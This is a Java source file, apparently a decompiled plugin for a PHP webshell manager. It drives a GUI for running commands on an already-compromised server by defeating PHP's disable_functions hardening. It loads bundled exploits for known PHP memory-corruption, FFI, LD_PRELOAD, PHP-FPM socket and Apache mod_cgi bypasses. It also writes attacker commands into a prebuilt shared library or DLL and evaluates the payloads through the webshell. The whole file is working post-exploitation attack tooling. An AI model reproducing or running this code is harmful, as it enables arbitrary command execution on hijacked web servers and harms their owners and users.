package shells.plugins.php;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.ShellManage;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.Arrays;
import java.util.HashMap;
import java.util.UUID;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
   payloadName = "PhpDynamicPayload",
   Name = "BypassDisableFunctions",
   DisplayName = "BypassDisableFunctions"
)
public class BypassDisableFunctions implements Plugin {
   private static final String CLASS_NAME = "BypassDisableFunctions.Run";
   private static final String[] BYPASS_MEM_PAYLOAD_LINUX = new String[]{"php-filter-bypass", "disfunpoc", "php-json-bypass", "php7-backtrace-bypass", "php7-gc-bypass", "php7-SplDoublyLinkedList-uaf", "procfs_bypass", "php74-FFI-BUG", "php5-imap_open", "php7-FFI", "PHP74-FFI-Serializable"};
   private static final String[] BYPASS_MEM_PAYLOAD_WINDOWS = new String[]{"php-filter-bypass", "php-com"};
   private static final String[] BYPASS_ENV_PAYLOAD = new String[]{"LD_PRELOAD"};
   private static final String[] BYPASS_AMC_PAYLOAD = new String[]{"Apache_mod_cgi"};
   private static final String[] BYPASS_FPM_ADDRESS = new String[]{"unix:///var/run/php5-fpm.sock", "unix:///var/run/php/php5-fpm.sock", "unix:///var/run/php-fpm/php5-fpm.sock", "unix:///var/run/php/php7-fpm.sock", "/var/run/php/php7.2-fpm.sock", "/tmp/php-cgi-56.sock", "/usr/local/var/run/php7.3-fpm.sock", "localhost:9000", "127.0.0.1:9000"};
   private static final HashMap<String, Integer> EXT_INFO = new HashMap();
   private final JPanel panel = new JPanel(new BorderLayout());
   private boolean loadState;
   private ShellEntity shellEntity;
   private Payload payload;
   private Encoding encoding;
   private final JPanel memBypassPanel = new JPanel(new BorderLayout());
   private final JPanel envBypassPanel = new JPanel(new BorderLayout());
   private final JPanel amcBypassPanel = new JPanel(new BorderLayout());
   private final JTabbedPane tabbedPane = new JTabbedPane();
   private PhpEvalCode phpEvalCode;
   private final JTextField memCommandTextField;
   private final JLabel memPayloadLabel;
   private final JLabel memCommandLabel;
   private final JButton memRunButton;
   private final JLabel memTempPathLabel;
   private final JTextField memTempPathTextField;
   private final RTextArea memResultTextArea;
   private final JComboBox<String> memPayloadComboBox;
   private final JSplitPane memSplitPane;
   private final JTextField envCommandTextField;
   private final JLabel envPayloadLabel;
   private final JLabel envSoPathLabel;
   private final JTextField envTempPathTextField;
   private final JLabel envCommandLabel;
   private final JButton envRunButton;
   private final RTextArea envResultTextArea;
   private final JComboBox<String> envPayloadComboBox;
   private final JSplitPane envSplitPane;
   private final JPanel fpmBypassPanel = new JPanel(new BorderLayout());
   private final JTextField fpmCommandTextField;
   private final JLabel fpmAddressLabel;
   private final JLabel fpmSoPathLabel;
   private final JTextField fpmTempPathTextField;
   private final JLabel fpmCommandLabel;
   private final JButton fpmRunButton;
   private final RTextArea fpmResultTextArea;
   private final JComboBox<String> fpmAddressComboBox;
   private final JSplitPane fpmSplitPane;
   private final JTextField amcCommandTextField;
   private final JLabel amcPayloadLabel;
   private final JLabel amcCommandLabel;
   private final JButton amcRunButton;
   private final RTextArea amcResultTextArea;
   private final JComboBox<String> amcPayloadComboBox;
   private final JSplitPane amcSplitPane;

   public BypassDisableFunctions() {
      this.memPayloadComboBox = new JComboBox(BYPASS_MEM_PAYLOAD_LINUX);
      this.memRunButton = new JButton("Run");
      this.memResultTextArea = new RTextArea();
      this.memCommandTextField = new JTextField(35);
      this.memPayloadLabel = new JLabel("payload");
      this.memCommandLabel = new JLabel("command");
      this.memTempPathLabel = new JLabel("Temp Path");
      this.memTempPathTextField = new JTextField(30);
      this.memSplitPane = new JSplitPane();
      this.envPayloadComboBox = new JComboBox(BYPASS_ENV_PAYLOAD);
      this.envRunButton = new JButton("Run");
      this.envResultTextArea = new RTextArea();
      this.envCommandTextField = new JTextField(35);
      this.envPayloadLabel = new JLabel("payload");
      this.envCommandLabel = new JLabel("command");
      this.envSoPathLabel = new JLabel("Temp Path");
      this.envTempPathTextField = new JTextField(30);
      this.envSplitPane = new JSplitPane();
      this.fpmAddressComboBox = new JComboBox(BYPASS_FPM_ADDRESS);
      this.fpmRunButton = new JButton("Run");
      this.fpmResultTextArea = new RTextArea();
      this.fpmCommandTextField = new JTextField(35);
      this.fpmAddressLabel = new JLabel("FPM/FCGI 地址");
      this.fpmCommandLabel = new JLabel("command");
      this.fpmSoPathLabel = new JLabel("Temp Path");
      this.fpmTempPathTextField = new JTextField(30);
      this.fpmSplitPane = new JSplitPane();
      this.amcPayloadComboBox = new JComboBox(BYPASS_AMC_PAYLOAD);
      this.amcRunButton = new JButton("Run");
      this.amcResultTextArea = new RTextArea();
      this.amcCommandTextField = new JTextField(35);
      this.amcPayloadLabel = new JLabel("payload");
      this.amcCommandLabel = new JLabel("command");
      this.amcSplitPane = new JSplitPane();
      this.fpmCommandTextField.setAutoscrolls(true);
      this.fpmCommandTextField.setText("whoami");
      this.fpmSplitPane.setOrientation(0);
      this.fpmAddressComboBox.setEditable(true);
      this.memCommandTextField.setAutoscrolls(true);
      this.memCommandTextField.setText("whoami");
      this.memSplitPane.setOrientation(0);
      this.envCommandTextField.setAutoscrolls(true);
      this.envCommandTextField.setText("whoami");
      this.envSplitPane.setOrientation(0);
      this.amcCommandTextField.setAutoscrolls(true);
      this.amcCommandTextField.setText("whoami");
      this.amcSplitPane.setOrientation(0);
      JPanel memTopPanel = new JPanel();
      memTopPanel.add(this.memPayloadLabel);
      memTopPanel.add(this.memPayloadComboBox);
      memTopPanel.add(this.memTempPathLabel);
      memTopPanel.add(this.memTempPathTextField);
      memTopPanel.add(this.memCommandLabel);
      memTopPanel.add(this.memCommandTextField);
      memTopPanel.add(this.memRunButton);
      this.memSplitPane.setTopComponent(memTopPanel);
      this.memSplitPane.setBottomComponent(new JScrollPane(this.memResultTextArea));
      this.memBypassPanel.add(this.memSplitPane);
      JPanel envTopPanel = new JPanel();
      envTopPanel.add(this.envPayloadLabel);
      envTopPanel.add(this.envPayloadComboBox);
      envTopPanel.add(this.envSoPathLabel);
      envTopPanel.add(this.envTempPathTextField);
      envTopPanel.add(this.envCommandLabel);
      envTopPanel.add(this.envCommandTextField);
      envTopPanel.add(this.envRunButton);
      this.envSplitPane.setTopComponent(envTopPanel);
      this.envSplitPane.setBottomComponent(new JScrollPane(this.envResultTextArea));
      this.envBypassPanel.add(this.envSplitPane);
      JPanel fpmTopPanel = new JPanel();
      fpmTopPanel.add(this.fpmAddressLabel);
      fpmTopPanel.add(this.fpmAddressComboBox);
      fpmTopPanel.add(this.fpmSoPathLabel);
      fpmTopPanel.add(this.fpmTempPathTextField);
      fpmTopPanel.add(this.fpmCommandLabel);
      fpmTopPanel.add(this.fpmCommandTextField);
      fpmTopPanel.add(this.fpmRunButton);
      this.fpmSplitPane.setTopComponent(fpmTopPanel);
      this.fpmSplitPane.setBottomComponent(new JScrollPane(this.fpmResultTextArea));
      this.fpmBypassPanel.add(this.fpmSplitPane);
      JPanel amcTopPanel = new JPanel();
      amcTopPanel.add(this.amcPayloadLabel);
      amcTopPanel.add(this.amcPayloadComboBox);
      amcTopPanel.add(this.amcCommandLabel);
      amcTopPanel.add(this.amcCommandTextField);
      amcTopPanel.add(this.amcRunButton);
      this.amcSplitPane.setTopComponent(amcTopPanel);
      this.amcSplitPane.setBottomComponent(new JScrollPane(this.amcResultTextArea));
      this.amcBypassPanel.add(this.amcSplitPane);
      this.tabbedPane.addTab("MemBypass", this.memBypassPanel);
      this.tabbedPane.addTab("EnvBypass", this.envBypassPanel);
      this.tabbedPane.addTab("FPMBypass", this.fpmBypassPanel);
      this.tabbedPane.addTab("AMCBypass", this.amcBypassPanel);
      this.panel.add(this.tabbedPane);
   }

   private void memRunButtonClick(ActionEvent actionEvent) {
      String payloadNameString = (String)this.memPayloadComboBox.getSelectedItem();
      String codeString = new String(functions.getResourceAsByteArray((Object)this, String.format("assets/%s.php", payloadNameString)));
      String cmd = this.memCommandTextField.getText();
      ReqParameter reqParameter = new ReqParameter();
      String resultFile = this.memTempPathTextField.getText() + "." + functions.md5(UUID.randomUUID().toString());
      if ("php-filter-bypass".equals(payloadNameString)) {
         cmd = String.format("%s > %s", cmd, resultFile);
      }

      reqParameter.add("cmd", cmd);
      String resultString = this.eval(codeString, reqParameter);
      this.memResultTextArea.setText(resultString);
      if ("php-filter-bypass".equals(payloadNameString)) {
         this.memResultTextArea.setText(this.encoding.Decoding(this.payload.downloadFile(resultFile)));
         this.payload.deleteFile(resultFile);
      }

   }

   private void fpmRunButtonClick(ActionEvent actionEvent) throws Exception {
      String payloadNameString = "FPM";
      String codeString = new String(functions.getResourceAsByteArray((Object)this, String.format("assets/%s.php", payloadNameString)));
      ReqParameter reqParameter = new ReqParameter();
      String tempDir = functions.formatDir(this.fpmTempPathTextField.getText());
      String cmdFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
      String resultFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
      String soFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
      String fpmHost = "";
      int fpmPort = -1;
      String fpmAddress = this.fpmAddressComboBox.getEditor().getItem().toString().trim();

      try {
         if (fpmAddress.startsWith("unix")) {
            fpmHost = fpmAddress;
         } else if (fpmAddress.startsWith("/")) {
            fpmHost = String.format("unix://%s", fpmAddress);
         } else {
            String[] is = fpmAddress.split(":");
            fpmHost = is[0];
            fpmPort = Integer.valueOf(is[1]);
         }
      } catch (Exception var13) {
         Log.error((Throwable)var13);
         GOptionPane.showMessageDialog((Component)null, var13.getMessage());
         return;
      }

      reqParameter.add("fpm_host", fpmHost);
      reqParameter.add("fpm_port", String.valueOf(fpmPort));
      reqParameter.add("soFile", soFile);
      reqParameter.add("cmdFile", cmdFile);
      reqParameter.add("resultFile", resultFile);
      reqParameter.add("so", this.generateExt(this.generateCmd(cmdFile, resultFile)));
      reqParameter.add("cmd", this.fpmCommandTextField.getText());
      String resultString = this.eval(codeString, reqParameter);
      this.fpmResultTextArea.setText(resultString);
   }

   private void envRunButtonClick(ActionEvent actionEvent) throws Exception {
      if (!this.payload.isWindows()) {
         String payloadNameString = (String)this.envPayloadComboBox.getSelectedItem();
         String codeString = new String(functions.getResourceAsByteArray((Object)this, String.format("assets/%s.php", payloadNameString)));
         ReqParameter reqParameter = new ReqParameter();
         String tempDir = functions.formatDir(this.envTempPathTextField.getText());
         String cmdFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
         String resultFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
         String soFile = tempDir + "." + functions.md5(UUID.randomUUID().toString());
         reqParameter.add("soFile", soFile);
         reqParameter.add("cmdFile", cmdFile);
         reqParameter.add("resultFile", resultFile);
         reqParameter.add("so", this.generateExt(this.generateCmd(cmdFile, resultFile)));
         reqParameter.add("cmd", this.envCommandTextField.getText());
         String resultString = this.eval(codeString, reqParameter);
         this.envResultTextArea.setText(resultString);
      } else {
         GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "仅支持Linux", "警告", 2);
      }

   }

   private void amcRunButtonClick(ActionEvent actionEvent) throws Exception {
      String payloadNameString = (String)this.amcPayloadComboBox.getSelectedItem();
      String codeString = new String(functions.getResourceAsByteArray((Object)this, String.format("assets/%s.php", payloadNameString)));
      String shellUrl = this.shellEntity.getUrl();
      int lastIndex = shellUrl.lastIndexOf("/");
      if (lastIndex != -1) {
         shellUrl = shellUrl.substring(0, lastIndex + 1);
      }

      ReqParameter reqParameter = new ReqParameter();
      reqParameter.add("shellurl", shellUrl);
      reqParameter.add("cmd", this.amcCommandTextField.getText());
      String resultString = this.eval(codeString, reqParameter);
      this.amcResultTextArea.setText(resultString);
   }

   private byte[] generateExt(String cmd) throws Exception {
      int bits = 86;
      String suffix = "so";

      try {
         bits = this.payload.isX64() ? 64 : 86;
      } catch (Exception var13) {
         Log.error((Throwable)var13);
      }

      try {
         if (!this.payload.isWindows()) {
            suffix = "so";
         } else {
            suffix = "dll";
         }
      } catch (Exception var12) {
         Log.error((Throwable)var12);
      }

      int start = (Integer)EXT_INFO.get(String.format("ant_x%s_%s_start", bits, suffix));
      int end = (Integer)EXT_INFO.get(String.format("ant_x%s_%s_end", bits, suffix));
      InputStream inputStream = BypassDisableFunctions.class.getResourceAsStream(String.format("assets/ant_x%s.%s", bits, suffix));
      int cmdLen = end - start;
      byte[] so = functions.readInputStream(inputStream);
      inputStream.close();
      ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
      byte[] _cmd = cmd.getBytes();
      byte[] temp = new byte[cmdLen - _cmd.length];
      Arrays.fill(temp, (byte)32);
      so[end] = 0;
      outputStream.write(so, 0, start);
      outputStream.write(_cmd, 0, _cmd.length);
      outputStream.write(temp, 0, temp.length);
      outputStream.write(so, end, so.length - end);
      return outputStream.toByteArray();
   }

   private String generateCmd(String cmdFile, String resultFile) {
      return !this.payload.isWindows() ? "bash " + cmdFile + " > " + resultFile : "cmd /c " + cmdFile + " > " + resultFile;
   }

   private String eval(String code, ReqParameter reqParameter) {
      try {
         if (this.phpEvalCode == null) {
            try {
               if (this.phpEvalCode == null) {
                  ShellManage shellManage = this.shellEntity.getFrame();
                  this.phpEvalCode = (PhpEvalCode)shellManage.getPlugin("P_Eval_Code");
               }
            } catch (Exception var4) {
               GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "no find plugin P_Eval_Code!");
               return "";
            }
         }

         return this.phpEvalCode.eval(code, reqParameter);
      } catch (Throwable var5) {
         return "";
      }
   }

   public void init(ShellEntity shellEntity) {
      this.shellEntity = shellEntity;
      this.payload = this.shellEntity.getPayloadModule();
      this.encoding = Encoding.getEncoding(this.shellEntity);
      this.envTempPathTextField.setText(this.payload.currentDir());
      this.fpmTempPathTextField.setText(this.payload.currentDir());
      this.memTempPathTextField.setText(this.payload.currentDir());
      if (this.payload.isWindows()) {
         this.memPayloadComboBox.removeAllItems();
         String[] var2 = BYPASS_MEM_PAYLOAD_WINDOWS;
         int var3 = var2.length;

         for(int var4 = 0; var4 < var3; ++var4) {
            String payloadName = var2[var4];
            this.memPayloadComboBox.addItem(payloadName);
         }
      }

      automaticBindClick.bindJButtonClick(this, this);
   }

   public JPanel getView() {
      return this.panel;
   }

   static {
      EXT_INFO.put("ant_x86_so_start", 275);
      EXT_INFO.put("ant_x86_so_end", 504);
      EXT_INFO.put("ant_x64_so_start", 434);
      EXT_INFO.put("ant_x64_so_end", 665);
      EXT_INFO.put("ant_x86_dll_start", 1544);
      EXT_INFO.put("ant_x86_dll_end", 1683);
      EXT_INFO.put("ant_x64_dll_start", 1552);
      EXT_INFO.put("ant_x64_dll_end", 1691);
   }
}
